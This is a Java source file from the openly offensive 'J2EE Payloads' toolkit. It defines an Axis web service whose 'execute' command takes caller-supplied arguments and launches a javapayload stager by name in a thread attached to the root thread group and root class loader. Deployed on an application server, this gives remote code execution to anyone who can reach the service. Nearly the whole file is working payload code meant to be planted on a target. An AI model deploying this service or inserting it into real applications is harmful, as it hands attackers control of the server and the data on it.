/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package j2eepayload.axis;

import javapayload.stager.Stager;

public class PayloadService {

	public String dispatch(String command, String arguments) throws PayloadException {
		if (command == null) {
			throw new PayloadException(new NullPointerException());
		} else if (command.equals("execute")) {
			execute(arguments);
			return "OK";
		} else {
			throw new PayloadException("Unsupported command: " + command);
		}
	}

	public Void execute(String cmd) throws PayloadException {
		try {
			final String[] args = cmd.split(" ");
			ThreadGroup tg = Thread.currentThread().getThreadGroup();
			while (tg.getParent() != null)
				tg = tg.getParent();
			PayloadRunner runner = new PayloadRunner(tg, args);
			ClassLoader cl = runner.getContextClassLoader();
			while (cl.getParent() != null)
				cl = cl.getParent();
			runner.setContextClassLoader(cl);
			runner.start();
			runner.join(1000);
			if (runner.getException() != null)
				throw runner.getException();
			return null;
		} catch (Throwable ex) {
			throw new PayloadException(ex);
		}
	}

	public static class PayloadRunner extends Thread {
		private final String[] args;
		private Exception exception;

		private PayloadRunner(ThreadGroup tg, String[] args) {
			super(tg, (Runnable) null);
			this.args = args;
		}

		public void run() {
			try {
				final Stager stager = (Stager) Class.forName("javapayload.stager." + args[0]).newInstance();
				stager.bootstrap(args, false);
			} catch (Exception ex) {
				exception = ex;
			}
		}

		public Exception getException() {
			return exception;
		}
	}
}
